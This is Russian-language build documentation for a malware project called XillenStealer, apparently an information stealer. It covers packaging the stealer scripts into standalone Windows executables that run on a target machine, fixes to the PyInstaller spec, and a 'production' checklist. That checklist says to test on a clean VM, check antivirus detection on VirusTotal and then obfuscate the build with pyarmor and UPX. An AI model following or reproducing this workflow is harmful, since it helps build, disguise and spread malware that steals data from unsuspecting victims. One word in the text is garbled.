# XillenStealer - Build Instructions

## Проблема с DLL в V4

Старая версия V4 собиралась с опцией `exclude_binaries=True`, из-за чего Python DLL не включался в exe. Это вызывало ошибку:
```
Failed to load Python DLL 'C:\Users\<USER>\Downloads\_internal\python313.dll'
```

## Решение: Standalone Build

Все новые билдеры создают **полностью автономные exe** со всеми DLL внутри. Такие exe работают на компах без Python.

---

## V4 Standalone Build

### Быстрая сборка:
```bash
python build_v4_standalone.py
```

### Что делает:
- Собирает `stealer.py` в `dist_v4/XillenStealerV4.exe`
- **Все DLL включены** (Python, зависимости)
- Размер: ~30-50 MB
- **Не требует Python на целевом компе**

### Проверка:
```bash
# Запустить на компе БЕЗ Python
XillenStealerV4.exe
```

---

## V5 Ultimate Build

### Быстрая сборка:
```bash
python compile_v5_ultimate.py
```

### Что делает:
- Собирает `stealer_v5_ultimate.py` в `dist/XillenStealerV5Ultimate.exe`
- Собирает Rust engine (опционально)
- Включает все модули V5
- Создает тестовые версии
- Применяет UPX сжатие

### Безопасные режимы:
```bash
# Тест режим (рекомендуется)
XillenStealerV5Ultimate.exe --test

# Dry-run (симуляция без записи)
XillenStealerV5Ultimate.exe --dry-run

# Только логи
XillenStealerV5Ultimate.exe --logging-only
```

---

## Сравнение билдов

| Версия | Билдер | Standalone | Размер | DLL |
|--------|--------|------------|--------|-----|
| **V4 (старый)** | `electron_builder` | ❌ Нет | ~5 MB | Требует Python |
| **V4 (новый)** | `build_v4_standalone.py` | ✅ Да | ~40 MB | Все внутри |
| **V5** | `compile_v5_ultimate.py` | ✅ Да | ~50 MB | Все внутри |

---

## Технические детали

### Что изменилось в билдере V4:

**Было (старый билдер):**
```python
exe = EXE(
    pyz,
    a.scripts,
    [],  # <--- ПУСТОЙ СПИСОК БИНАРНИКОВ
    exclude_binaries=True,  # <--- ПРОБЛЕМА ТУТ
    ...
)
```

**Стало (новый билдер):**
```python
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,  # <--- ВСЕ DLL ВКЛЮЧЕНЫ
    a.zipfiles,
    a.datas,
    [],  # <--- НЕТ exclude_binaries
    ...
)
```

### Результат:
- ✅ Python DLL включена
- ✅ Все зависимости внутри
- ✅ Работает без Python
- ✅ Можно распространять как portable

---

## Рекомендации

### Для тестирования:
```bash
# Сначала V5 в тест режиме
python stealer_v5_ultimate.py --test

# Проверить V4
python build_v4_standalone.py
cd dist_v4
XillenStealerV4.exe
```

### Для production:
1. Собери через новый билдер
2. Тестируй на чистой VM без Python
3. Проверь детект на virustotal.com
4. РСмать обфускацию (pyarmor, upx)

---

## Устранение проблем

### Ошибка "Failed to load Python DLL"
**Причина:** Старый билдер с `exclude_binaries=True`
**Решение:** Используй `build_v4_standalone.py` или `compile_v5_ultimate.py`

### Exe слишком большой
**Причина:** Все DLL внутри (~40-50 MB)
**Решение:** Это нормально для standalone. Можно уменьшить через UPX (автоматически).

### Не запускается после билда
**Причина:** Недостающие hidden imports
**Решение:** Добавь в `hiddenimports` в spec файле

---

## Changelog

**2025-01-XX:**
- ✅ Создан `build_v4_standalone.py` для автономной сборки V4
- ✅ Исправлена проблема с отсутствием Python DLL
- ✅ Добавлен `compile_v5_ultimate.py` для V5 с безопасными режимами
- ✅ Документация по билдам обновлена

**2024-XX-XX (старый):**
- ❌ `electron_builder/builder_backend.py` создавал неполные exe
- ❌ `exclude_binaries=True` вызывал ошибки DLL
